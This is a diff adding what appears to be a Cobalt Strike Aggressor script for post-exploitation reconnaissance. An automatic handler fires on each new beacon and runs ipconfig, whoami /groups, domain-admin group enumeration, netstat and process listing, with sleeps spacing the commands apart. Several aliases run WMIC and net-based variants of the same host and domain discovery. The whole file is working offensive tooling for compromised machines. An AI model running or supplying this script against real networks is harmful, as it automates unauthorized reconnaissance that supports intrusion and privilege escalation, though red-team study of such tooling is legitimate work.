@@ -1,0 +1,62 @@
+alias SA {
+	blog($1, "
+	beacon_initial
+	SA_Advanced	*warning* no sleep written in
+	SA_Powerpick	
+	SA_Powershell
+	SA_XP		*WARNING* no sleep wirtten in (will work on other WIN OS's aswell
+	SA_WMIC
+")
+}
+
+on beacon_initial {
+	bpowerpick($1, "ipconfig /all ; sleep 120 ; whoami /groups ; sleep 120 ; net groups \"domain admins\" /domain ; sleep 120 ; netstat -napo tcp");
+	bps($1);
+	blog($1, "shell net user \"poopface.loser\" /domain");
+}
+
+alias SA_Advanced {
+        bshell($1, "wmic qfe list");
+        bshell($1, "wmic os get osarchitecture");
+        bshell($1, "netstat -napo tcp");
+        bshell($1, 'net group "domain admins" /domain');
+        bnet($1, "view");
+}
+
+alias SA_Powerpick {
+        bpowerpick($1, "ipconfig /all ; sleep 120 ; whoami /groups ; sleep 120 ; net groups \"domain admins\" /domain ; sleep 120 ; netstat -napo tcp");
+        bps($1);
+        blog($1, "shell net user \"poopface.loser\" /domain");
+}
+
+alias SA_Powershell {
+        bpowershell($1, "ipconfig /all ; sleep 120 ; whoami /groups ; sleep 120 ; net groups \"domain admins\" /domain ; sleep 120 ; netstat -napo tcp");
+        bps($1);
+        blog($1, "shell net user \"poopface.loser\" /domain");
+}
+
+
+alias SA_XP {
+        bshell($1, "ipconfig /all");
+        bshell($1, "whoami /groups");
+        bps($1);
+        bshell($1, "net groups \"domain admins\" /domain");
+        bshell($1, "netstat -napo tcp");
+        blog($1, "shell net user \"poopface.loser\" /domain");
+}
+
+alias SA_WMIC {
+        bshell($1, "wmic nicconfig where \"IPEnabled = True\" get IPAddress")
+        bshell($1, "wmic nicconfig where \"IPEnabled = True\" get DefaultIPGateway /value")
+        bshell($1, "wmic nicconfig where \"IPEnabled = True\" get IPSubnet")
+        bshell($1, "wmic nicconfig where \"IPEnabled = True\" get DNSHostname")
+        bshell($1, "wmic nicconfig where \"IPEnabled = True\" get DNSDomainSuffixSearchOrder")
+        bshell($1, "wmic nicconfig where \"IPEnabled = True\" get DNSServerSearchOrder")
+        bshell($1, "netstat -napo tcp")
+        bshell($1, "wmic process list brief")
+        bshell($1, "wmic computersystem get username")
+        bshell($1, "net groups \"domain admins\" /domain")
+        blog($1, "net users \"poopface.loser\" /domain")
+}
+
+
